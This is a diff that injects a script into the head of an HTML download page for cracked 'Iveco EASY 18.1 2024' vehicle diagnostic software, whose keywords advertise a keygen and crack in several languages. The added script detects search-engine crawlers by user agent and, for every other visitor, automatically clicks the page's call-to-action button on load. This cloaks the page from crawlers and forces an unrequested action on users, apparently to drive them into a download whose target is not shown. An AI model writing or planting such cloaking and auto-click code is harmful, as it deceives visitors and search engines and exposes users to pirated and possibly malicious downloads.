@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Iveco EASY 18.1 2024</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download Iveco EASY 18.1 2024 diagnostic software for ECU, engine tests, and wiring diagrams. Available in multiple languages.">
     <meta name="keywords" content="Iveco EASY 18.1 2024, Iveco EASY 18.1 software, Iveco EASY 18.1 download, Iveco EASY 18.1 free download, Iveco EASY 18.1 diagnostic software, Iveco EASY 18.1 diagnostic software download, Iveco EASY 18.1 diagnostic software free, Iveco EASY 18.1 keygen, Iveco EASY 18.1 crack, Iveco E.A.SY 18.1 2024, E.A.SY Electronic Advanced System 2024, Iveco ECU diagnostic software, vehicle ECU diagnostics, Iveco EASY interface 2024, engine test software 2024, Iveco diagnostic tools 2024, ECU parameter programming Iveco, E.A.SY repair guide 2024, wiring diagrams E.A.SY, Iveco diagnostic module, electronic control unit diagnostics, E.A.SY platform interface, automotive diagnostic tools Iveco, E.A.SY software interface, electronic diagnostics Iveco, Ивеко EASY 18.1 2024, скачать Ивеко EASY 18.1, бесплатно Ивеко EASY 18.1, Ивеко EASY 18.1 диагностика, Ивеко EASY 18.1 программное обеспечение, Ивеко EASY 18.1 скачать бесплатно, Ивеко EASY 18.1 кряк, Iveco EASY 18.1 2024 завантажити, Iveco EASY 18.1 безкоштовно, Iveco EASY 18.1 діагностичне програмне забезпечення, скачати Iveco EASY 18.1 безкоштовно, Iveco EASY 18.1 діагностика">
     <style>
